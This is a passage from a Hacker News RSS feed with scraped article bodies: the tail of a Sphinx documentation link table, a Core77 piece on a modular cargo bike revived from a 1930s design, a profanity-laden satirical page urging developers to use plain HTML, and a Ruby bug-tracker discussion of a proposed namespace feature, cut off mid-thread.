<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/automatic-doc-generation.html">tutorial/automatic-doc-generation</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/coverage.html">usage/extensions/coverage</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html">usage/extensions/autodoc</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/doctest.html">usage/extensions/doctest</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/describing-code.html">tutorial/describing-code</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/duration.html">usage/extensions/duration</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/more-sphinx-customization.html">tutorial/more-sphinx-customization</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/example_google.html">usage/extensions/example_google</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/example_numpy.html">usage/extensions/example_numpy</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/example_numpy.html">usage/extensions/example_numpy</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/example_google.html">usage/extensions/example_google</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/extlinks.html">usage/extensions/extlinks</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/intersphinx.html">usage/extensions/intersphinx</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/githubpages.html">usage/extensions/githubpages</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/deploying.html">tutorial/deploying</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/graphviz.html">usage/extensions/graphviz</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/math.html">usage/extensions/math</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/ifconfig.html">usage/extensions/ifconfig</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/doctest.html">usage/extensions/doctest</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/imgconverter.html">usage/extensions/imgconverter</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/math.html">usage/extensions/math</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/index.html">usage/extensions/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/development/index.html">development/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/inheritance.html">usage/extensions/inheritance</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/graphviz.html">usage/extensions/graphviz</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/intersphinx.html">usage/extensions/intersphinx</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/quickstart.html">usage/quickstart</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/linkcode.html">usage/extensions/linkcode</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/viewcode.html">usage/extensions/viewcode</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/math.html">usage/extensions/math</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/configuration.html">usage/configuration</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/napoleon.html">usage/extensions/napoleon</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/example_google.html">usage/extensions/example_google</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/todo.html">usage/extensions/todo</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/extending_build.html">development/tutorials/extending_build</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/viewcode.html">usage/extensions/viewcode</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/linkcode.html">usage/extensions/linkcode</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/index.html">usage/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/end.html">tutorial/end</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/installation.html">usage/installation</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/getting-started.html">tutorial/getting-started</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/markdown.html">usage/markdown</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/parserapi.html">extdev/parserapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/quickstart.html">usage/quickstart</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/index.html">index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/referencing.html">usage/referencing</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/roles.html">usage/restructuredtext/roles</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/basics.html">usage/restructuredtext/basics</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/directives.html">usage/restructuredtext/directives</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/directives.html">usage/restructuredtext/directives</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/basics.html">usage/restructuredtext/basics</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/domains.html">usage/restructuredtext/domains</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/index.html">usage/domains/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/field-lists.html">usage/restructuredtext/field-lists</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/directives.html">usage/restructuredtext/directives</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/index.html">usage/restructuredtext/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/basics.html">usage/restructuredtext/basics</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/restructuredtext/roles.html">usage/restructuredtext/roles</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/referencing.html">usage/referencing</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/theming.html">usage/theming</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/development/html_themes/index.html">development/html_themes/index</a></p></td>
</tr>
</tbody>
</table>
</section>
</section>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reviving a modular cargo bike design from the 1930s (121 pts)]]></title>
            <link>https://www.core77.com/posts/136773/Reviving-a-Modular-Cargo-Bike-Design-from-the-1930s</link>
            <guid>43963397</guid>
            <pubDate>Mon, 12 May 2025 14:29:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.core77.com/posts/136773/Reviving-a-Modular-Cargo-Bike-Design-from-the-1930s">https://www.core77.com/posts/136773/Reviving-a-Modular-Cargo-Bike-Design-from-the-1930s</a>, See on <a href="https://news.ycombinator.com/item?id=43963397">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            
    <div id="post_header">
        

            <ul>
                


                            </ul>
        

            <h2>Reviving a Modular Cargo Bike Design from the 1930s </h2>
                    <h2>The Cyclauto is efficient and flexible</h2>
                    

        
    </div>

    




            <section id="post">




<p id="86342e_2862" data-ic-marker="d4914a_4414">Your average cargo bike typically has a long frame divided into two areas: One for the cargo, and one for the rider. The rider is positioned just forward of the rear wheel, with a chain delivering power from the pedals to that rear wheel.</p><p id="491cca_412" data-ic-marker="2d88c8_3194"><img src="https://s3files.core77.com/blog/images/1706542_81_136773_WbcGr7xAD.jpg"> </p><p id="2d2ae7_5728" data-ic-marker="4d221c_1077"><img src="https://s3files.core77.com/blog/images/1706536_81_136773_umWW_xf9H.jpg"> </p><p id="c88329_825" data-ic-marker="e88146_3943">French mobility company <a href="https://cyclauto.com/" rel="">Cyclauto</a> has gone through the history books to revive an alternate design from the 1930s. </p><p id="89a6e2_3706" data-ic-marker="118f6e_2828"><img src="https://s3files.core77.com/blog/images/1706532_81_136773_AAkTLuhtc.jpg"> </p><p id="98363b_5029" data-ic-marker="11415f_4685">This design, originally by French industrialist Auguste Reymond, places the rider directly above the front wheel. They pedal this wheel directly; there's no chain, reducing maintenance needs. A three-speed gearbox in the hub makes starting easier.</p><p id="9b4b0e_492" data-ic-marker="49df00_561"><img src="https://s3files.core77.com/blog/images/1706537_81_136773_TfqAOvVF9.jpg"> </p><p id="c624c3_759" data-ic-marker="5bee5e_2919"><img src="https://s3files.core77.com/blog/images/1706551_81_136773_k4tYkuCEM.jpg"> </p><p id="c387f6_5821" data-ic-marker="bbadf5_3951"><img src="https://s3files.core77.com/blog/images/1706533_81_136773_rqkQXmDEB.jpg"> </p><p id="c49d2d_349" data-ic-marker="c48db6_869"><img src="https://s3files.core77.com/blog/images/1706534_81_136773_Y20eWwFD6.jpg"> </p><p id="d81827_2318" data-ic-marker="280388_3861">The cargo-carrying part, in Cyclauto's modern rendition, is detachable, recalling a semi-trailer. This means a wide variety of trailer styles can be fitted to the drive unit, creating a modular system that can handle a wide variety of user needs. The Cyclauto can be configured to move cargo, people or even commercial fixtures (think food cart).</p><p id="b7c331_2384" data-ic-marker="836b2f_5170"><img src="https://s3files.core77.com/blog/images/1706543_81_136773_iwrF3s4p6.jpg"></p><p id="edc124_533" data-ic-marker="a732ad_711"><img src="https://s3files.core77.com/blog/images/1706535_81_136773_K5S5qqVVc.jpg"> </p><p id="662454_1296" data-ic-marker="26161b_1605"><img src="https://s3files.core77.com/blog/images/1706553_81_136773_dZXmuqKs9.jpg"></p><p id="e18cec_536" data-ic-marker="1fa7ee_2326"><img src="https://s3files.core77.com/blog/images/1706539_81_136773_GWsOTy65S.jpg"></p><p id="d78dd0_1616" data-ic-marker="c4d3d5_4611"><img src="https://s3files.core77.com/blog/images/1706540_81_136773_3ZBonsLMz.jpg"> </p><p id="8d218f_3233" data-ic-marker="fa17a0_792"><img src="https://s3files.core77.com/blog/images/1706550_81_136773_eOHZe_dOw.jpg"> </p><p id="19851_8376" data-ic-marker="ee7579_1595"><img data-image-width="880" data-image-height="271" data-image-id="1706526" src="https://s3files.core77.com/blog/images/1706526_81_136773_ZSsaBls35.jpg"></p><p id="be49ec_2047" data-ic-marker="886977_4385">An additional benefit to the two-piece frame is that the bike can be broken down for transport, allowing the user "to load it into a trunk for easy transport from point A to point B."</p><p id="b1997d_2375" data-ic-marker="7125cc_3658"><img src="https://s3files.core77.com/blog/images/1706546_81_136773_HpBuRpuww.jpg"> </p><p id="d820b0_3010" data-ic-marker="1c5e16_4298">Lastly, the company says the shorter wheelbase of their arrangement provides a tighter turning radius, making the bike easier to maneuver in urban environments.</p><p id="b349d_824" data-ic-marker="101bc4_3636"><img src="https://s3files.core77.com/blog/images/1706547_81_136773_HpBuRpuww.jpg"> </p><p id="1e428e_2982" data-ic-marker="d0ac03_3970"><img src="https://s3files.core77.com/blog/images/1706530_81_136773_tlh5zv_uO.jpg"> </p><p id="faddc1_4746" data-ic-marker="7b4e77_2967"><img src="https://s3files.core77.com/blog/images/1706545_81_136773_CyIh67fcJ.jpg"> </p><p id="6ab988_1844" data-ic-marker="ba7170_3537">The Cyclauto has been making the rounds at bike shows, but the company has yet to reveal production dates. </p>
        

            </section>

                


                


<div>
    <ul>
        <li data-this-post-id="136773" data-this-author-id="0">
            
            
            <p>Favorite This</p>
        </li>
       <li data-this-post-title="Reviving a Modular Cargo Bike Design from the 1930s " data-this-post-id="136773" data-this-author-id="0">
            
            
            <p>Comment</p>
        </li>
        
    </ul> 
</div>






           


        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Just use HTML (151 pts)]]></title>
            <link>https://justfuckingusehtml.com</link>
            <guid>43962942</guid>
            <pubDate>Mon, 12 May 2025 13:55:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://justfuckingusehtml.com">https://justfuckingusehtml.com</a>, See on <a href="https://news.ycombinator.com/item?id=43962942">Hacker News</a></p>
<div id="readability-page-1" class="page">


<header>
  
  <p>
    Hey, dipshit! You know what loads faster than your bloated, overengineered
    mess? Plain, unadulterated HTML. And you know what doesn't break every
    motherfucking Tuesday? HTML that just fucking works. Why the fuck are you
    overcomplicating things, you masochistic fuck? You're out here acting like
    you're building the next goddamn moon landing when all you need is a button
    and some text.
  </p>

  <p>
    Newsflash, asshole: the web was doing just fine before your
    bloated frameworks crawled out of the sewer. You're out here dropping ten
    grand on some fancy-ass framework like it's a Gucci purse, just to haul
    around the same shitty groceries you could've carried in a plastic bag from
    1995. Why the hell are you jumping through all these hoops when HTML's been
    sitting there, ready to go, since the dawn of the goddamn internet?
  </p>
</header>

<section>
  <h2>
    So you call yourself a web developer? Fucking pathetic.
  </h2>

  <p>
    You've gotta be kidding me, asshat. Do you even fucking know how to display
    a button on screen without the current modern fuckery you lean on? Here,
    little shit, is your button:
  </p>

  

  <p>
    Tattoo this code on your forehead so that you'll remember when you look at
    your fat face in the mirror:
  </p>

  <pre><code>&lt;button&gt;Fucking button&lt;/button&gt;</code></pre>

  <p>
    But did you notice something, you smug bastard? This HTML shit is the
    fucking Energizer Bunny of the web. It just keeps going, no fancy plugins or
    updates required. Your precious framework's out there choking on its own
    hype, obsolete before you even finish the tutorial, while this button's
    still kicking ass like it's 1995. It's been here since the web was a
    screaming toddler, and it'll still be standing when your stack's just a
    dusty footnote in some asshole's commit history.
  </p>

  <p>
    Can't make shit beautiful with HTML, you say? Eat this, you pixel-pushing fuck:
  </p>

  

  <p>
    Why it's beautiful:
  </p>

  <ul>
    <li>It is visible</li>
    <li>It is clickable</li>
    <li>It's just fucking beautiful</li>
  </ul>

  <p>
    Seriously, what else do you fucking need, you entitled prick? A goddamn
    participation trophy for using a framework to do what HTML does out of the
    box? Maybe a gold star for managing to overcomplicate something that's been
    solved for decades? Get over yourself, asshole. HTML works, and it doesn't
    need your bullshit to prove it.
  </p>
</section>

<section>
  <h2>Now that we have AI, you <em>still</em> use JS frameworks? Are you fucking serious?</h2>

  <p>
    AI's out here, a gift from the heavens (or at least from Sam Altman's nerd
    fortress) ready to write your shitty little to-do app in five seconds flat.
    It can churn out pixel-perfect HTML, debug your fuck-ups, and probably even
    wipe your ass if you ask nicely. But no, you're still humping your
    frameworks like they're the last lifeboat on the Titanic. What the hell is
    wrong with you? Are you that addicted to 10,000 dependencies and a build
    process that takes longer than your last failed relationship?
  </p>

  <p>
    Sam Altman's AI army is laughing its silicon balls off while you're
    knee-deep in React's virtual DOMshit, praying your app doesn't choke on its
    own bloated corpse. This isn't progress. It's a fucking <em>tragedy</em>.
    You've got a shiny new Ferrari in your garage, and you're still riding a
    rusty tricycle with a flat tire. Grow the fuck up.
  </p>
</section>

<section>
  <h2>Why HTML rocks</h2>

  <h3>Everybody knows HTML</h3>

  <p>
    Listen up, dipshit. <em>Every-fucking-body</em> knows HTML. Your dearly great grandma?
    She was out there in the goddamn trenches of World War 2, dodging Nazi bullets
    while hand-coding <code>&lt;table&gt;</code> layouts to send encrypted messages to the Allies.
    Your grandad? He's got a motherfucking PhD in HTML from the prestigious
    University of Who-Gives-a-Rat's-Ass, probably hanging right next to his "I
    Survived Dial-Up" trophy. Your dad? That bastard was mumbling
    <code>&lt;div&gt;</code> and <code>&lt;span&gt;</code> before he could even
    choke out "mama". Shit, even your drooling mutt probably has a side gig
    churning out HTML sites on Fiverr. So why the fuck are we still stuck
    answering your brain-dead questions? Jesus Christ, get with the program.
  </p>

  <h3>No fucking hydration errors. Drink some water, asshole</h3>

  <p>
    What in the <em>ever-loving</em> fuck is a hydration error? Sounds like some hipster
    bullshit a barista would spew when your overpriced oat milk latte isn't wet
    enough. "Oh, my bad, bro, your coffee's got a hydration error". Get the fuck
    outta here. And "tree shaking"? Are you kidding me? What is this, a coding
    bootcamp or a lumberjack convention? "Yeah, boss, I spent all day shaking trees
    to trim my JavaScript bundle. Where's my flannel shirt?". Who the hell invents
    this pretentious crap? I don't have time to decode your buzzword salad, you
    self-important jackass. HTML doesn't pull this nonsense. It just fucking works.
  </p>

  <h3>You don't need to "support" HTML</h3>

  <p>
    Ever seen some motherfucker hire a whole team just to babysit HTML? That's
    fucking right. Nobody does that bullshit. HTML is so damn reliable it
    doesn't need a 24/7 support hotline like some needy-ass framework. While
    your bloated, over-engineered frameworks are out there throwing tantrums
    every time a browser updates or crying for patches every five minutes, HTML
    just sits back, cracks a beer, and does its goddamn job. So next time some
    slick salesman tries to shove "premium HTML support" down your throat, tell
    them to fuck off.
  </p>

  <h3>You don't need to "deploy" HTML</h3>

  <p>
    Deploying HTML? That's easier than deleting your browser history after a
    porn binge. Just throw your files into a web server directory, and boom. The
    whole fucking internet can see your crappy page. No 12-step deployment
    process, no DevOps wizards casting spells, no fucking Docker containers or
    CI/CD pipelines. Just drag, drop, and you're done. Meanwhile, your fancy
    frameworks need a goddamn NASA launch sequence just to push a button that
    says "Hello, World". HTML doesn't give a shit about your trendy deployment
    tools. It"s the dive bar of the web: always open, no frills, just works. Your
    framework? The hipster café that"s "temporarily closed" every time you need
    it.
  </p>
</section>

<section>
  <h2>
    You don't need Sparkling Ass UI to make shit look good, dumbass
  </h2>

  <p>
    All you need is fucking <em>brains</em>. Every year, yet another steaming pile of
    shit gets released: blazingly fast frameworks that are two farts ahead of
    the previous "groundbreaking" crap. Some call it progress. More rounded
    corners, more colorful colors, and one more thing to learn.
  </p>

  <p>
    <em>*<sup>F</sup>u<sup>c</sup><sub>k</sub> t<sub>h</sub><sup>a</sup><sub>t</sub>*</em>
  </p>

  <p>
    Just fucking use HTML. I shit you not, it actually looks good:
  </p>

  <ul>
    <li><b>Bold text</b>? Check.</li>
    <li><u>Underlined text</u>. Got it.</li>
    <li><s>Strike fucking through</s>? <mark>Highlighted text</mark>? <em>Emphasized text</em>?</li>
    <li>Check ✓, check ✓, and ~holy shit~ check again. HTML's been doing this while you were still drooling
      over React.</li>
  </ul>

  <p>
    Oh, and abbreviations? <abbr title="Hyper Mother Fucking Text">HTML</abbr>.
    Go ahead, find your dirty trackpad behind the slice of pizza and hover over this motherfucker.
  </p>

  <h2>h2: Big motherfucker</h2>
  <p>Perfect for screaming your main points at the top of your lungs, like "FUCK FRAMEWORKS!"</p>

  <h3>h3: Slightly smaller motherfucker</h3>
  <p>Still loud enough to tell your subpoints to sit down and shut up.</p>

  <h4>h4: Even smaller</h4>
  <p>For when you need to whisper some passive-aggressive bullshit.</p>

  <h5>h5: You can still see me</h5>
  <p>Small, but not small enough to ignore, like that fucking bug in your framework that haunts your every commit.</p>

  <h6>h6: Nobody even uses these</h6>
  <p>Unless you're writing the fine print for your soul-selling terms of service.</p>

  <p>
    See? HTML's got hierarchy, style, and your framework's out here trying to
    reinvent the wheel, but HTML already built the goddamn car, you
    overcomplicating prick.
  </p>
</section>

<section>
  <h2>Interactive shit? HTML's got it, no JS needed</h2>

  <p>
    Think you need your precious JavaScript for interactivity? Wrong, you clueless fuck. HTML's got expandable sections
    baked in:
  </p>

  <details>
    <summary>Expandable motherfucker</summary>
    <p>Fucking boo, motherfucker 👻</p>
  </details>

  <p>
    And popovers? Yeah, native, no framework bloat. Eat this:
  </p>

  
  <p>Didn't even know HTML could do this, huh? Suck it.</p>

  <h2>Dialogs that'll make you cry for mommy</h2>

  <p>
    Still not impressed? Fine, fine. Toss in a pinch of inline JS (right in the HTML, you purist twat) and you've got
    native dialogs.
    Pay close attention: no build steps, no frameworks, just raw power.
  </p>

  <dialog id="myDialog">
    <p>Hello, you ungrateful shit!</p>
    
  </dialog>
  
</section>

<section>
  <h2>Forms that work on every Casio calculator</h2>

  <form action="/submit" method="post">
    

    
    
  </form>

  <p>
    <small>
      *This form is powered real, raw HTML. No frameworks were harmed, because
      they're useless anyway.*
    </small>
  </p>

  <p>
    So, what's your excuse now, huh? Still clinging to your trendy frameworks
    like a scared little bitch? HTML's like that crusty old barstool that's seen
    every fight and still holds your drunk ass up, no questions asked.
    Frameworks? They're the flimsy plastic chairs that snap the second you lean
    back too hard: overengineered bullshit that collapses under its own weight.
    HTML doesn't need your pity or your goddamn fanfare. It's too busy being the
    spine of every site you've ever clicked on, you ungrateful prick. So keep
    jerking off to your latest tech fad—HTML's over here, sipping whiskey, ready
    to outlast your entire career.
  </p>
</section>

<hr>

<section>
  <h2>"Why not write Assembly then?"</h2>

  <p>
    Oh, here comes the genius motherfucker with the big-brain counterargument:
    "Well, if HTML's so great, why not just write everything in Assembly, huh?".
    Wow, look at you, you clever little prick. Did you come up with that all by
    yourself? Writing web pages in Assembly is like using a fucking chainsaw to
    slice your overcooked steak: sure, it'll get the job done, but you're gonna
    look like a complete asshole while you're at it. HTML just works, you
    absolute tool. It's been the backbone of the web since Al Gore flipped the
    switch, and it'll still be here long after your trendy framework is rotting
    in a GitHub graveyard. So take your smartass logic and shove it. HTML's
    king, and you're just a peasant with a keyboard.
  </p>
</section>


<section>
  <h2>HTML lends crotches to your fucking JS</h2>
  

  <p>
    Did you know that when you slap an id on your HTML element, HTML doesn't
    just sit there like a lazy fuck. It actually creates a fucking variable in
    JavaScript for you? Yeah, you heard me, you clueless bastard. You don't even
    have to lift a finger. HTML's out here doing the heavy lifting while your JS
    is still trying to figure out how to tie its shoes.
  </p>

  <p>
    Now go try it, open the console and type "i_am_doofus". Boom! There it is, you
    ungrateful shit. HTML just handed you a variable on a silver platter, and
    you didn't even have to beg for it. This is basic shit, and if you didn't
    know this, congrats. You're officially dumber than a bag of rocks.
  </p>

  <p>
    This is HTML flexing its muscles, showing you it's not just some static
    bitch. It's dynamic, it's powerful, and it's been carrying your sorry ass
    since day one. Meanwhile, your JS is out here acting like it's the star of
    the show, when really, it's just riding HTML's coattails like a cheap date.
  </p>

  <p>
    So next time you're jerking off to your fancy JS frameworks, remember: HTML's
    the one doing the real work, and it's laughing at your overcomplicated
    bullshit.
  </p>
</section>

<section>
  <h2>Words of wisdom</h2>

  <blockquote cite="https://justfuckinghtml.com">
    <p>
      It's the kind of page that makes you want to weep tears of joy and throw
      your overpriced JavaScript framework out the window. It's the kind of page
      that makes you want to quit your job and become a full-time HTML
      evangelist. It's the kind of page that makes you want to start a cult
      dedicated to the worship of HTML. It's the kind of page that makes you
      want to write a love letter to HTML and send it to the HTML gods. It's the
      kind of page that makes you want to build a shrine to HTML in your living
      room and invite all your friends over for a candlelit HTML worship
      session. It's the kind of page that makes you want to start a YouTube
      channel dedicated to HTML tutorials and rants. It's the kind of page that
      makes you want to write a book about HTML and self-publish it on Amazon.
      It's the kind of page that makes you want to start a TikTok account
      dedicated to HTML and post daily HTML dance videos. It's the kind of page
      that makes you want to start a LinkedIn account dedicated to HTML and
      connect with other HTML professionals.
    </p>
  </blockquote>
  <p>— <cite>Just Fucking Use HTML</cite></p>
</section>






</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ruby 3.5 Feature: Namespace on read (169 pts)]]></title>
            <link>https://bugs.ruby-lang.org/issues/21311</link>
            <guid>43962770</guid>
            <pubDate>Mon, 12 May 2025 13:39:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bugs.ruby-lang.org/issues/21311">https://bugs.ruby-lang.org/issues/21311</a>, See on <a href="https://news.ycombinator.com/item?id=43962770">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="tab-content-history">
  <div id="change-112900"><p>As a proof of concept this is a very valuable idea, and will give users a chance to experiment with it.</p>
<p>I wonder about the long-term ergonomics of this though, and if it may make sense to potentially introduce in Ruby 4 a new keyword for <code>namespace</code> that is stronger than <code>module</code> for wrapping:</p>
<pre><code data-language="ruby"><span>namespace</span> <span>NamespaceOne</span>
  <span>require</span> <span>"./app1"</span>
<span>end</span>

<span>namespace</span> <span>NamespaceTwo</span>
  <span>require</span> <span>"./app2"</span>
<span>end</span>

<span>p</span> <span>NamespaceOne</span><span>::</span><span>App</span><span>.</span><span>port</span> <span># 2048</span>
<span>p</span> <span>NamespaceOne</span><span>::</span><span>App</span><span>.</span><span>val</span> <span># "2048"</span>

<span>p</span> <span>NamespaceTwo</span><span>::</span><span>App</span><span>.</span><span>port</span> <span># 4096</span>
<span>p</span> <span>NamespaceTwo</span><span>::</span><span>App</span><span>.</span><span>val</span> <span># "8192"</span>
</code></pre>
<p>A <code>require</code> that is run inside of a <code>namespace</code> could serve the same function mentioned above, but could additionally provide an isolate environment for defining other code:</p>
<pre><code data-language="ruby"><span>namespace</span> <span>Payrolls</span>
  <span>class</span> <span>Calculator</span><span>;</span> <span>end</span>
  <span>private</span> <span>class</span> <span>RunTaxes</span><span>;</span> <span>end</span>
<span>end</span>

<span>Payrolls</span><span>::</span><span>Calculator</span> <span># can access</span>
<span>Payrolls</span><span>:RunTaxes</span> <span># raises violation error</span>

<span>namespace</span> <span>Payments</span>
  <span>class</span> <span>RecordTransaction</span><span>;</span> <span>end</span>
<span>end</span>
</code></pre>
<p>For Ruby 3.x I would agree that the proposed syntax is good for experimentation, but would ask that we consider making this a top-level concept in Ruby 4.x with a <code>namespace</code> keyword to fully isolate wrapped state.</p></div>
  
  <div id="change-112901"><p>A few quick questions:</p>
<p>Assuming a normal execution context, nesting at the top level of a file is empty. Would it be also empty if the file is loaded under a namespace?</p>
<p>The description mentions classes and modules, which is kind of intuitive. They are relevant because they are the containers of constants. But, as we know, constants can store anything besides class and module objects. In particular, constants from the root namespace, recursively, can store any kind of object that internally can refer to any other object. There is a graph of pointers.</p>
<p>So, when a namespace is created, do we have to think that the entire object tree is deep cloned? (Maybe with CoW, but conceptually?) For example, let's imagine <code>C::X</code> is a string in the root namespace, and we create <code>ns</code>. Would <code>ns::C::X.clear</code> clear the string in both namespaces?</p>
<p>Global variables stay global I guess?</p></div>
  
  <div id="change-112902"><p>@baweaver I don't have strong opinion about adding <code>namespace</code> keyword, but having a block parameter on <code>Namespace.new</code> could provide similar UX without changing syntax.</p>
<pre><code data-language="ruby"><span>NamespaceOne</span> <span>=</span> <span>Namespace</span><span>.</span><span>new</span> <span>do</span>
  <span>require</span> <span>"./app1"</span>
<span>end</span>
<span>p</span> <span>NamespaceOne</span><span>::</span><span>App</span><span>.</span><span>port</span> <span>#=&gt; 2048</span>
</code></pre>
<p>This looks a less smart but may not worst. Having <code>Kernel#namespace</code> could be an alternative idea.</p>
<pre><code data-language="ruby"><span>NamespaceOne</span> <span>=</span> <span>namespace</span> <span>do</span>
  <span>require</span> <span>"./app1"</span>
<span>end</span>
</code></pre></div>
  
  <div id="change-112903"><p>fxn (Xavier Noria) wrote in <a href="#note-2">#note-2</a>:</p>
<blockquote>
<p>A few quick questions:</p>
<p>Assuming a normal execution context, nesting at the top level of a file is empty. Would it be also empty if the file is loaded under a namespace?</p>
</blockquote>
<p>Yes. At that time, <code>self</code> will be a cloned (different) object from <code>main</code> in optional namespaces.</p>
<blockquote>
<p>So, when a namespace is created, do we have to think that the entire object tree is deep cloned? (Maybe with CoW, but conceptually?)</p>
</blockquote>
<p>Conceptually, yes. Definitions are deeply cloned. But objects (stored on constants, etc) will not be cloned (See below).</p>
<blockquote>
<p>For example, let's imagine <code>C::X</code> is a string in the root namespace, and we create <code>ns</code>. Would <code>ns::C::X.clear</code> clear the string in both namespaces?</p>
</blockquote>
<p>Yes. (I hope built-in classes/modules don't have such mutable objects, but those should have :-( )</p>
<blockquote>
<p>Global variables stay global I guess?</p>
</blockquote>
<p>Global variables are also separated by namespace. Imagine $LOAD_PATH and $LOADED_FEATURES that have different sets of load paths and actually loaded file paths, which should be different from each other namespace.<br>
Providing protection for unexpected changes of global variables by libraries or other apps is a part of namespace concept.</p></div>
  
  <div id="change-112904">
    
    

    <ul>
       <li><strong>Description</strong> updated (<a title="View differences" href="https://bugs.ruby-lang.org/journals/112904/diff?detail_id=69492">diff</a>)</li>
    </ul>
    
    </div>
  
  <div id="change-112907"><p>Thanks <a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a>.</p>
<blockquote>
<p>Conceptually, yes. Definitions are deeply cloned. But objects (stored on constants, etc) will not be cloned (See below).</p>
</blockquote>
<p>Let me understand this one better.</p>
<p>In Ruby, objects are stored in constants. Conceptually, a constant <code>X</code> storing a string object and a constant <code>C</code> storing a class object are not fundamentally different. Do you mean namespace creation traverses constant trees, clones only the values that are class and module objects, and keeps the rest of object references, which become shared between namespaces?</p>
<p>Even in the case of classes and modules, what happens to the objects in their ivars?</p>
<p>I do not know about builtin, but in the case of user-defined classes/modules, I don't think we can assume they do not mutate their state. We could have 2500 of them in the root namespace when the namespace is created.</p></div>
  
  <div id="change-112908"><p>fxn (Xavier Noria) wrote in <a href="#note-6">#note-6</a>:</p>
<blockquote>
